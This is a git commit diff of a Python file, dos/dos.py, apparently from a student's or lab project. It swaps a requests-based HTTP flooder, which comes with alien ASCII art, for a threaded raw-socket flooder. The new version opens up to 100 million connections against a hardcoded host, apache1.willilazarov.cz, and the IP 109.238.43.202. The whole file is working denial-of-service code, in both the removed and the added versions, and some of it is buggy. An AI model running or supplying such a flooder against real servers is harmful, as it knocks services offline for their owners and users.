c96b74841b651932ed437ebbb3cc371daff10da6
xsucho08 <xsucho08@vutbr.cz>
2020-11-15 19:42:49 +0100

    threading, slowloris, too slow

--- dos/dos.py
+++ dos/dos.py
@@ -1,79 +1,68 @@
-import optparse
+import socket
+import string
+import sys
+import threading
 import time
-import requests
-import threading  # modules importationimport requests
-
-def stresser():  # stresser function
-    _host = 'http://apache1.willilazarov.cz'
-    while (1 < 4):  # infinite loop
-        try:
-            r = requests.get(_host)  # sending requests
-            print(" [*] flooding {} in port 80  ".format(_host))
-        except (requests.ConnectionError, requests.HTTPError):  # if host don't exist
-            print("[-] host don't exist  ")
-            sys.exit()  # exit
 
 
-def _threads_():  # threading function
+# Print thread status
+def print_status():
+    global thread_num
+    thread_num += 1
+    if thread_num % 100 == 0:
+        print("cont: " + str(thread_num))
 
-    c = threading.Thread(target=stresser)  # creating threads
-    d = threading.Thread(target=stresser)
-    a = threading.Thread(target=stresser)
-    e = threading.Thread(target=stresser)
-    z = threading.Thread(target=stresser)
-    x = threading.Thread(target=stresser)
-    c1 = threading.Thread(target=stresser)
-    d1 = threading.Thread(target=stresser)
-    a1 = threading.Thread(target=stresser)
-    e1 = threading.Thread(target=stresser)
-    z1 = threading.Thread(target=stresser)
-    x1 = threading.Thread(target=stresser)
+# Perform the request
+def dos_attack():
+    print_status()
+    url_path = str(string.ascii_letters + string.digits + string.punctuation)
+    # Create a raw socket
+    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        # Open the connection on that raw socket
+        dos.connect((ip, port))
+        # Send the request according to HTTP spec
+        msg = "GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, host)
+        byt = msg.encode()
+        dos.send(byt)
+    except socket.error:
+        dos.close()
+    finally:
+        # Close our socket gracefully
+        dos.shutdown(socket.SHUT_RDWR)
+        dos.close()
 
-    c.start()  # starting threads
-    d.start()
-    a.start()
-    e.start()
-    z.start()
-    x.start()
-    c1.start()
-    d1.start()
-    a1.start()
-    e1.start()
-    z1.start()
-    x1.start()
+if __name__ == '__main__':
+    host = "http://apache1.willilazarov.cz/"
+    ip = "109.238.43.202"
+    port = 80
+    num_requests = 100000000
+    sys.argv = [host, ip, port, num_requests]
 
+    # Convert FQDN to IP
+    try:
+        host = str(sys.argv[1]).replace("https://", "").replace("http://", "")
+        print(host)
+        ip = socket.gethostbyname(host)
+        print(ip)
+    except socket.gaierror:
+        print("Wrong website")
+        sys.exit(2)
 
+    # Create a shared variable for thread counts
+    thread_num = 0
+    thread_num_mutex = threading.Lock()
 
-def main():  # main function ( most important )
+    print("Attack started")
 
-    print("""
-********************************
-*        _______                 * 
-*     .adOOOOOOOOOba.            *
-*    dOOOOOOOOOOOOOOOb           *
-*   dOOOOOOOOOOOOOOOOOb          *
-*  dOOOOOOOOOOOOOOOOOOOb         *
-* |OOOOOOOOOOOOOOOOOOOOO|        *
-* OP'~"YOOOOOOOOOOOP"~`YO        *
-* OO     `YOOOOOP'     OO        *
-* OOb      `OOO'      dOO        *
-* YOOo      OOO      oOOP        *
-*` OOOo     OOO     oOOO'        *
-* ` OOOb._,dOOOb._,dOOO'         *
-*  ` OOOOOOOOOOOOOOOOO'          *
-*    OOOOOOOOOOOOOOOOO           *
-*    YOOOOOOOOOOOOOOOP           *
-*   ` OOOOOOOOOOOOOOO'           *
-*    ` OOOOOOOOOOOOO'            *
-*      `OOOOOOOOOOO'             *
-*        `~OOOOO~'               *
-**********************************
-* Alien flooder (HTTP flooder)   *
-**********************************      
-""")  # ascii code (index)
-    print("[*] start flooding ")  # info
-    time.sleep(3)  # sleeping
-    _threads_()  # threading function start
+    # Spawn a thread per request
+    thread_list = []
+    for i in range(num_requests):
+        new_thread = threading.Thread(target=dos_attack)
+        new_thread.start()
+        thread_list.append(new_thread)
+        # Adjusting this sleep time will affect requests per second
+        time.sleep(0.00001)
 
-
-main()  # main function start
+    for current_thread in all_threads:
+        current_thread.join()  # Make the main thread wait for the children threads
